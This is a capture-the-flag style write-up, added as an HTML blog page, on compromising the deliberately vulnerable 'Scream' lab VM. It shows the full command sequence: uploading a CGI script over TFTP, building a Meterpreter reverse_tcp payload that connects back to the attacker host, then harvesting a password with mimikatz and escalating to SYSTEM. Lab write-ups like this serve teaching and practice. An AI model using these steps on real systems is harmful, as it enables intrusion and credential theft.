@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Scream - Method 2 (Longer/Harder) - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2014-05-16">May 16, 2014</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/scream">scream</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Scream - Method 2 (Longer/Harder)</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<h2 id="ftp:ed63a6c7e568009db84b215907f6385d">FTP</h2>
+
+<p>As we can see from the original <code>Nmap</code> scan in Method 1, there is an FTP service which allows anonymous read access to part of the file system.  Peeking inside the <code>bin</code> and <code>root</code> folders, gives us a good indication that this where the <code>TinyWeb</code> service is running, however we have no write access.</p>
+
+<h2 id="tftp:ed63a6c7e568009db84b215907f6385d">TFTP</h2>
+
+<p>A UDP <code>Nmap</code> scan showed the port 69 (TFTP) may be open.</p>
+
+<pre><code class="language-text">root@kali:~# nmap -n -sU -sV 192.168.127.130
+69/udp open  tftp?
+1 service unrecognized despite returning data.
+</code></pre>
+
+<p>The problem with TFTP is there is no way to know which remote directory the service is bound to, and we therefore have no idea where the files are going to go.  I created a very basic HTML page and uploaded it via TFTP.</p>
+
+<p>Using the web service and the FTP access, I could confirm the file was written to the <code>root</code> folder.</p>
+
+<pre><code class="language-text">root@kali:~# vi test.html
+&lt;html&gt;
+&lt;body&gt;
+&lt;p&gt;This is a test.&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+root@kali:~# tftp 192.168.127.130
+tftp&gt; put test.html
+Sent 58 bytes in 0.0 seconds
+
+root@kali:~# ftp 192.168.127.130
+ftp&gt; ls root
+200 Port command successful
+150 Opening data channel for directory list.
+drwxr-xr-x 1 ftp ftp              0 Feb 08  2013 cgi-bin
+---------- 1 ftp ftp          14539 Oct 31  2012 index.html
+---------- 1 ftp ftp             63 May 16 13:56 test.html
+</code></pre>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/scream/test.png"  />
+    
+    
+</figure>
+</div>
+
+<h2 id="tinyweb-cgi:ed63a6c7e568009db84b215907f6385d">TinyWeb CGI</h2>
+
+<p>I went and downloaded TinyWeb from RITLabs and found that within their download package, they had some example files for CGI applications.</p>
+
+<p>I uploaded a few of these to the <code>cgi-bin</code> folder via TFTP and execucated them via <code>cURL</code>.</p>
+
+<pre><code class="language-text">root@kali:~# cp scream/tinyweb/cgi/HELLO.PL /root/hello.pl
+
+root@kali:~# tftp 192.168.127.130
+tftp&gt; put cgi-bin/hello.pl
+Sent 330 bytes in 0.0 seconds
+
+root@kali:~# curl http://192.168.127.130/cgi-bin/hello.pl
+Hello, World!
+</code></pre>
+
+<p>The next test was to see if I could upload a CGI script that would run an executable (i.e. a Meterpreter payload&hellip;).</p>
+
+<pre><code class="language-text">root@kali:~# cp scream/tinyweb/cgi/helloexe.pl /root/exploit.pl
+change line --&gt; print `exploit.exe`;
+</code></pre>
+
+<h2 id="payload:ed63a6c7e568009db84b215907f6385d">Payload</h2>
+
+<p>Now to make the exploit, but there&rsquo;s an added complication.  I found that normal PE32 executables created by msfpayload would not execute on the remote host, and if you examine the doscgi.exe file (in the cgi examples in the tinyweb download) you can see it&rsquo;s an MS-DOS executable.</p>
+
+<p>There&rsquo;s no option in <code>msfpayload</code> or <code>msfencode</code> to do this as far as I can tell, so it has to be done manually.</p>
+
+<p>The first stage is to produce a raw payload.</p>
+
+<p><code>root@kali:~# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.127.127 R &gt; exploit_raw</code></p>
+
+<p>Then convert this into ASM format using Disassemble Ruby library.</p>
+
+<p><code>root@kali:~# ruby /usr/share/metasploit-framework/lib/metasm/samples/disassemble.rb /root/exploit_raw &gt; /root/exploit_asm</code></p>
+
+<p>There are two lines we have to manually add to the top of this file.</p>
+
+<pre><code class="language-text">root@kali:~# vi exploit_asm 
+.section '.text' rwx
+.entrypoint
+</code></pre>
+
+<p>Then finally encode this into the final executable.</p>
+
+<pre><code class="language-text">root@kali:~# ruby /usr/share/metasploit-framework/lib/metasm/samples/peencode.rb /root/exploit_asm
+saved to file &quot;a.out&quot;
+
+root@kali:~# mv a.out /root/exploit.exe
+
+root@kali:~# file exploit.exe
+exploit.exe: MS-DOS executable, MZ for MS-DOS
+</code></pre>
+
+<h2 id="upload-and-execute:ed63a6c7e568009db84b215907f6385d">Upload and Execute</h2>
+
+<p>Upload these two files via TFTP, then start the Metasploit Multi Hander.</p>
+
+<pre><code class="language-text">root@kali:~# tftp 192.168.127.130
+tftp&gt; put cgi-bin/exploit.pl
+Sent 538 bytes in 0.0 seconds
+tftp&gt; put cgi-bin/exploit.exe
+Sent 1028 bytes in 0.0 seconds
+
+root@kali:~# msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=192.168.127.127 E
+</code></pre>
+
+<p>I then used <code>cURL</code> to execute the CGI script, which in turn executes the exe.</p>
+
+<pre><code class="language-text">root@kali:~# curl http://192.168.127.130/cgi-bin/exploit.pl
+[*] Sending stage (769536 bytes) to 192.168.127.130
+[*] Meterpreter session 1 opened (192.168.127.127:4444 -&gt; 192.168.127.130:1034)
+</code></pre>
+
+<h2 id="post-exploitation:ed63a6c7e568009db84b215907f6385d">Post Exploitation</h2>
+
+<pre><code class="language-text">meterpreter &gt; getuid
+Server username: SCREAM\alex
+</code></pre>
+
+<p>Unlike in the previous method, where the SSH service was running as SYSTEM, the TinyWeb service is running as user <code>alex</code>.  This means that some privilege escalation is now required.</p>
+
+<p>First I loaded the Mimikaz extension, to find alex&rsquo;s password stored in memory.  This wasn&rsquo;t really necessary, as there aren&rsquo;t any other services which I can authenticate to.  I just did it for the sake of completeness.</p>
+
+<pre><code class="language-text">meterpreter &gt; load mimikatz 
+meterpreter &gt; wdigest
+0;34668  NTLM       SCREAM        alex             thisisaverylongpassword
+</code></pre>
+
+<p>All that&rsquo;s required to elevate is to migrate the Meterpreter service into a process running as SYSTEM.  I attempted to migrate into 644 LSASS.</p>
+
+<pre><code class="language-text">meterpreter &gt; migrate 664
+[*] Migrating from 3272 to 664...
+[*] Migration completed successfully.
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2014  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
